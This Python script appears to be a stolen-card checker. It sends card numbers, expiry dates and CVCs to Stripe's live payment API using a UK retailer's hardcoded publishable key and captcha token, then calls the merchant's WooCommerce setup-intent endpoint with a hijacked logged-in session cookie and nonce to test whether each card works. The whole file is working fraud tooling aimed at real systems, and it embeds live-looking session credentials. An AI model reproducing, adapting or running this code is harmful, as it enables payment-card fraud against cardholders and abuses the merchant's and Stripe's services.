import time
import requests
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#i_expir
    yy = yy.split("20")[1]
  r = requests.session()
  import requests
 
  headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

  data = f'type=card&billing_details[name]=+&billing_details[email]=fkevekdcekd%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b3cbdc8c-14a9-4fcb-8f0d-a44b74b1d2ac6fe321&muid=cb197577-7b37-4d93-bac7-b5d03bc8a09a954f17&sid=384e6054-59e7-4bb9-a62b-6795b36488ccef61dc&payment_user_agent=stripe.js%2Faca17ed1ee%3B+stripe-js-v3%2Faca17ed1ee%3B+split-card-element&referrer=https%3A%2F%2Flotusromeo.co.uk&time_on_page=27181&key=pk_live_FsSjPJ91PbCCFZLzirdvDWgL&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.hadwYXNza2V5xQZm1Wobsil0Bu4WOE5bYnvPKkyW6WvqCQcg--VMeVrbN_uBHX69_Y-gVssWlO2_KJiULTa_5NY_3bSNX9m4HHrm9hbo7cT9yQjaxKKMHt88CU7F11On4CKD1THPRlQbjg_ixs6_3fiKJe3VuQgVVEsBXmlrGzFvf6lGvdIqKhPZEm4RmGWFvI2hg_xzSRjkbi7ENrWB8TQkPMwiNWUECY2yF8eveUnyBOGBfnOycefw4CtTdNynYA5GEw0YygdUMYNZh3ZUDzuaZ-HnZRE42UOaq_6InGwbnOcWnFlZk9stEvAH6wiHO3iV7BU2ehcQAPs2ztGiDyIjZgMBsTJ9al-l7wn2AsneGQfmfpJE3_HzbonM2QyiTsLJDAZ50j1r_C0Zfok3LgoEtRpEO95BJDvhT162lts3t73eZQeok97SeNPmq_rQ5utTt1cEwFy76eGru-twtCEGlChxAYgBiWwvIhj6eho99Q_Aj2HIzL0gHeY9_H5_S1OSmAT-JKqx6okYu-66hEzcMXQeMzy08_d8ga6qDA6fILrqVDoh_e-BGx9ap8NUXChj1xzemQvEzSkt2YbQcSQwUMJl5idMOEAb2yPeeFc2PSLeCBYo7FeMpTR6mgZEhmYSM8tL9xCHrsatknZCGIESC60g1YnwSUvhxGkq8utJ81JraeQtg_GlSdIx8juEV32LDwl15T48UhI773-Peoasybs1n2i-W744XSM5Ju44Ksqxi_EpMCxsnuztAToFnA4und45Yl1ptf-T3folof6RQ14fDZtaSl-A5XPkctKeljC2lG1BNxJfo2zcITlJ17PkihGSXQo8nIIGoxQfOIeOSFvdgRJqqeJLZiAVa-9wwmzIe_kWFDwQOPom3u4IxtuzZavNEqN5Pr-cHqkt88dr5A-2A6ALe9hzZujbAc9zLLhHDCJaTmSdegeEgKbeZrzQpe2OThkgN70u6XeVt8106CiANHBticNJiCm6CTiPG-JQxUD82d6Q3ZRic4s8dZr9tJnDtFq1hDS_5bBc6Y4bmsWsYmlYNV6JhE3Vys0_SM2ZMsIaWjl08IimPKNFDzxujXHuQhf52CuwdgGv7JYAKDrWgtvg2hNidcGoUj3ny1HMMGb9HxPNuzMeIpNUu_cgQ5FkVmqPW_Xi9LJJXdiRPAIbNoKpGzryWcx9gOJpBUlCPOYZH8enM9BvVNO9mJ-VkjMHboc9WtmCB9vMVegPpaSpt_QWCaFsVvM6c3gkPd6K-byuE7gR3A-y5ZT1A7_Waa6jWkMpn6te84Hn1tQQUIG7I85tPIAD-E7ZLQ4mvDhCL0ykS46qH-fzxOOSUV8Y-mw4jAuFcoV-I_xRGoBJVJdmxdfmoq7Eq1HZaJjXM_QIAuupCl_StkigODZLpx0pY8UHf7-9PJ-UYWwgYnONuLLIB6_wRL2RxYbuzqgivGh1KX4YzVMk15ivN8PjWIR8Pbi7oESfxVSm3zTl1fUNL2oXmIjOPwqawc-KIBF6cw1WjRDnpiq9IMgqWkmajVi7dm9i76SJhoyZVj4EIAjfpFXPBsYw8-lD1liUUlncKleokeFlGdmaYUHMEEE9U-FwBwfe_bzBSKBX7RouQblCQA9ZVesiuHPhX7zPjhF_2PR3bNuvKmJznyNoPBN-tYqN02hvfFtG0kBRckIen_mK4rOYTjfCJzK2j-ha2jpYB-6NlrYW0cY6JsiNw3T3atEWvUtGBRA3gpClJMZPRhYE3obmPo_FTyMZXPWE2xTKFoujPEhRCZrSTT_cAHeIYqG6mPUJ1NgtaOhojXx7IX_4T-rBQhQYNChvhAL0Ija-pcriuxdMBx7T3Z8_M0cvU2O-93Xg6fCD_vHY8hkvzBOAQkLvLRYrgTWuUElkFBiNdp5mT6KYm_Clk2AtETpIoWjydLZRKojjQ51LxgbvO1-ptUVAr3hX2Tww9tcxGAWHtunbttfZV7auVNl5ExFnvUvpGOOtWH-3UyjbldKDPFzUMYWz3xFagbFgofLF4G5cyPsxNarg25ZmsFM74-n5Q8GjoYfuGKlp2eLgsAI-T_tAE8J2xDV_wQRIl7OPhRqiaB_u4tAGGHYBhCE1Oe5Tm8oez6qgUKpRS0X9jnkFe-BJXtg6irBXrBFzJRXJ54eGP6TQnz0ZMwYWUJHr5-7w0tYSv-ZZtFaP-6t2ydNXM220o2V4cM5mqA3hqHNoYXJkX2lkzhQ8hB-ia3KoMWE4Mzk0NziicGQA.dQrgabcQmArBZVhCdBsUxQBGGboI5bMEnc0IPH--HII'

  response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
  try:
    id=response.json()['id']
  except:
    return '#'
  import requests
 
  cookies = {
    'tk_or': '%22%22',
    'tk_r3d': '%22%22',
    'tk_lr': '%22%22',
    '_gid': 'GA1.3.1222476552.1722289474',
    '_gat_gtag_UA_232126455_1': '1',
    '_fbp': 'fb.2.1722289475733.6924199455270243',
    '_hjSessionUser_2089172': 'eyJpZCI6IjQ5ZjE0NGFlLTA1MmMtNTNhNC04Y2IyLWRlNzU4YTUwYjBjYSIsImNyZWF0ZWQiOjE3MjIyODk0NzYwNTIsImV4aXN0aW5nIjp0cnVlfQ==',
    '_hjSession_2089172': 'eyJpZCI6IjRiNTY2Y2RmLTExNjQtNDA2Ni1hMWMxLTM5NDBlZmFhOThmZSIsImMiOjE3MjIyODk0NzYwNTgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=',
    '_ga': 'GA1.1.217227159.1722289474',
    'wordpress_logged_in_8e8e8664d64650e8eb663dfa135cc970': 'fkevekdcekd%7C1723499094%7CXCVmlunH9iSZagC7CON3ldsnT9U8laQhUUummezv0M4%7C8f59040efdd99a39421638688e40fc882a54c1dcb157a685dea38af053b318ed',
    '_ga_19YZPX4ZQG': 'GS1.1.1722289474.1.1.1722289494.0.0.0',
    '_ga_PYWMWQRTR1': 'GS1.1.1722289475.1.1.1722289494.0.0.0',
    '__stripe_mid': 'cb197577-7b37-4d93-bac7-b5d03bc8a09a954f17',
    '__stripe_sid': '384e6054-59e7-4bb9-a62b-6795b36488ccef61dc',
}

  headers = {
    'authority': 'lotusromeo.co.uk',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'tk_or=%22%22; tk_r3d=%22%22; tk_lr=%22%22; _gid=GA1.3.1222476552.1722289474; _gat_gtag_UA_232126455_1=1; _fbp=fb.2.1722289475733.6924199455270243; _hjSessionUser_2089172=eyJpZCI6IjQ5ZjE0NGFlLTA1MmMtNTNhNC04Y2IyLWRlNzU4YTUwYjBjYSIsImNyZWF0ZWQiOjE3MjIyODk0NzYwNTIsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_2089172=eyJpZCI6IjRiNTY2Y2RmLTExNjQtNDA2Ni1hMWMxLTM5NDBlZmFhOThmZSIsImMiOjE3MjIyODk0NzYwNTgsInMiOjEsInIiOjEsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjoxLCJzcCI6MX0=; _ga=GA1.1.217227159.1722289474; wordpress_logged_in_8e8e8664d64650e8eb663dfa135cc970=fkevekdcekd%7C1723499094%7CXCVmlunH9iSZagC7CON3ldsnT9U8laQhUUummezv0M4%7C8f59040efdd99a39421638688e40fc882a54c1dcb157a685dea38af053b318ed; _ga_19YZPX4ZQG=GS1.1.1722289474.1.1.1722289494.0.0.0; _ga_PYWMWQRTR1=GS1.1.1722289475.1.1.1722289494.0.0.0; __stripe_mid=cb197577-7b37-4d93-bac7-b5d03bc8a09a954f17; __stripe_sid=384e6054-59e7-4bb9-a62b-6795b36488ccef61dc',
    'origin': 'https://lotusromeo.co.uk',
    'referer': 'https://lotusromeo.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
}

  params = {
    'wc-ajax': 'wc_stripe_create_setup_intent',
}

  data = {
    'stripe_source_id': id,
    'nonce': 'ff26a4a0a2',
}

  response = requests.post('https://lotusromeo.co.uk/', params=params, cookies=cookies, headers=headers, data=data).json()
  time.sleep(20)
  try:
    ii=response
  except:
      return 'success'
  return ii